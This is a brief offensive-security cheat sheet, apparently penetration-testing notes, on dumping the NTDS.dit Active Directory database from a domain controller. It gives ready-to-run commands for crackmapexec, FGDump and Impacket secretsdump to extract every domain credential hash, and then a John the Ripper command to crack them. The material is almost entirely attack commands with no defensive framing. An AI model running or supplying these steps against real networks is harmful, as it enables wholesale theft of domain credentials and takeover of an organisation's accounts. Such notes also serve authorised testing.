# Dumping NTDS.dit

NTDS.dit contains all the info on the domain (hashes...), contained on the DC in **C:\Windows\NTDS\ntds.dit**

## cme
```bash
# dump ntds on domain controller
cme smb $dc_ip -u $admin -p $pass --ntds
```
## FGDump
{% embed url="https://www.softpedia.com/get/Security/Security-Related/fgdump.shtml" %} FGDump {% endembed %}

```powershell
.\fgdump.exe
```
## secretsdump 
```bash
# when you have the ntds.dit
./secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL
```

## Cracking the hashes
```bash
john --format=NT hash --show
```
